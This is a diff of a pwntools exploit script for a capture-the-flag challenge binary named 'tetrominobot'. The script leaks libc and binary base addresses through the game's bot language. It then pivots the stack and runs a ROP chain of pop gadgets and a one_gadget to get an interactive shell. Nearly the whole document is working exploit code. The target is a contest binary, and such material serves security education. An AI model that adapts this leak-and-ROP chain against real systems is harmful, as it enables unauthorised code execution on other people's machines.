@@ -1,14 +1,13 @@
 from pwn import *
 from functools import reduce
 
-context.aslr = False
-# context.log_level = "debug"
 context.log_level = "info"
 
 def spawn_process(): # as the server runs it
-    return process(["./out/handout/ld-linux-x86-64.so.2", "--library-path", \
-                    "./out/handout", "./out/handout/tetrominobot"])
-# return process(["./out/handout/tetrominobot"])
+    return process(["./ld-linux-x86-64.so.2", "--library-path", \
+                    ".", "./tetrominobot"])
+    # return remote("tetrominobot.ctf.maplebacon.org", 1337)
+    # return process(["./tetrominobot"])
 
 SEED_SIZE = 2 ** 16;
 GOAL_SRAND = 0
@@ -16,10 +15,9 @@ GOAL_SRAND = 0
 def prog_sum(prog):
     return reduce(lambda a, c: a + c, prog, 0) % SEED_SIZE
 
-# played manually with srand 0 searching for addresses, logging inputs
+# played manually with srand patched to 0 searching for addresses, logging inputs
 cmdlog_ceiling = b"=== g  g--.ad-d---d-d=dda=d=d=dd=d.."
 cmdlog_tspin = b"d----   g    gw===    -g====s.wd==.-.w--a   a.g"
-
 
 def wrap_curly(bs):
     return b'{' + bs + b'}'
@@ -55,11 +53,6 @@ def manual_in_to_bot(bs):
             + b') { mem[5] = call(' \
             + cmd_to_call(cmd) \
             + b'); } '
-    # mem[0] = string address
-    # mem[1] = callable address
-    # mem[2] = 0 (segfault barrier)
-    # mem[4] = global counter
-    # mem[5] = f return value
 
     cond_move = b''.join(map(cmd_to_cond, range(len(bs)), bs))
     increment_counter = b'mem[4] = mem[4] + 1; '
@@ -67,7 +60,6 @@ def manual_in_to_bot(bs):
 
     p1 = wrap_curly(cond_move + increment_counter + p_mem)
     return p1
-# return srand_override(b'{call(drop)}')
 
 def pwn_send_bot(p, bot):
     def srand_override(prog):
@@ -81,7 +73,6 @@ def pwn_send_bot(p, bot):
     p.sendline(b"-d_name")
     p.recvuntil(b'> ')
     p.sendline(srand_override(bot))
-
 
 def pwn_send_bot_recv(p, bot):
     pwn_send_bot(p, bot)
@@ -117,33 +108,76 @@ def pwn_1_find_libc(p):
             libc_l = unsigned(int(mem5retval))
 
     libc_leak = (libc_u << 32) + libc_l
-    libc_leak_offset = 0x15555541a780 - 0x155555200000
-    # base address
+    libc_leak_offset = 0x15555541a780 - 0x155555200000 # base
     return libc_leak - libc_leak_offset
 
 def pwn_2_find_bin(p):
     (_, tsp_score) = pwn_send_bot_recv(p, manual_in_to_bot(cmdlog_tspin))
-    return int(tsp_score)
+    bin_leak_offset = 0x155555513ae0 - 0x155555509000 # base
+    return int(tsp_score) - bin_leak_offset
 
-def pwn_3_arb_call(p, libc_addr):
-    exit_offset = 0x000455f0 + libc_addr
-    str_offset = 0x00019767 + libc_addr # char *strtok
-    print("libc: ", hex(exit_offset))
-    pause()
-    callbot = b"{mem[0]=" + bytes(str(str_offset), 'utf-8') + b"; mem[1]=" + bytes(str(exit_offset), 'utf-8') + b"call(strtok)" + b"}"
-    pwn_send_bot(p, callbot)
+def libc_addr(leakc, n):
+    a = 0
+    match n:
+        case "base":
+            a = 0x155555200000
+        case "exit":
+            a = 0x155555200000 + 0x000455f0
+        case "strtok_str":
+            a = 0x155555200000 + 0x00019767
+        case "load_stack": # mov rsp, rdx ; ret
+            a = 0x000015555525a170
+        case "oneg_rdi_rsi":
+            a = 0x1555552ebcf8
+        case "pop_rsi":
+            a = 0x000015555522be51
+        case "pop_rdi":
+            a = 0x000015555522a3e5
+        case "pop_rbp":
+            a = 0x000015555522a2e0
+
+    return a + leakc - 0x155555200000
+
+def tbot_mem_addr(leakb):
+    return leakb + 0x1555555130d0 - 0x155555509000 # base
+
+# strtok is called first. we look for this string in the gfunc table
+# (which extends into this bit of memory) and call the stack mover.
+# from there it's rop.
+def pwn_3_mov_stack(p, leakc, leakb):
+    bot = ("{"
+           + " mem[0]=" + str(libc_addr(leakc, "pop_rsi"))
+           + " mem[1]=0"
+           + " mem[2]=" + str(libc_addr(leakc, "pop_rdi"))
+           + " mem[3]=0"
+           + " mem[4]=" + str(libc_addr(leakc, "pop_rbp"))
+           + " mem[5]=" + str(tbot_mem_addr(leakb))
+           + " mem[6]=" + str(libc_addr(leakc, "oneg_rdi_rsi"))
+           + " mem[7]=12345"
+           + " mem[8]=" + str(libc_addr(leakc, "strtok_str"))
+           + " mem[9]=" + str(libc_addr(leakc, "load_stack"))
+           + " call(strtok)"
+           + " }").encode()
+    # print(p.pid)
+    # pause()
+    pwn_send_bot(p, bot)
+
 
 def main():
     p = spawn_process()
-    libc_addr = pwn_1_find_libc(p)
-    bin_addr = pwn_2_find_bin(p)
+    libc_leak = pwn_1_find_libc(p)
+    bin_leak = pwn_2_find_bin(p)
+    log.info("libc leak: " + hex(libc_leak))
+    log.info("tetrominobot leak: " + hex(bin_leak))
 
-    log.info("libc addr: " + hex(libc_addr))
-    log.info("tetrominobot addr: " + hex(bin_addr))
-    # libc = ELF("./out/handout/libc.so.6")
-    pwn_3_arb_call(p, libc_addr)
-    print("PID:", p.pid)
-    pause()
-    p.close()
-
+    pwn_3_mov_stack(p, libc_leak, bin_leak)
+    p.interactive()
 main()
+
+# gdb script
+# b *0x15555550d1d5
+# c
+# nextcall
+
+# tbot memory = 0x1555555130d0
+# game board =  0x155555513ae0
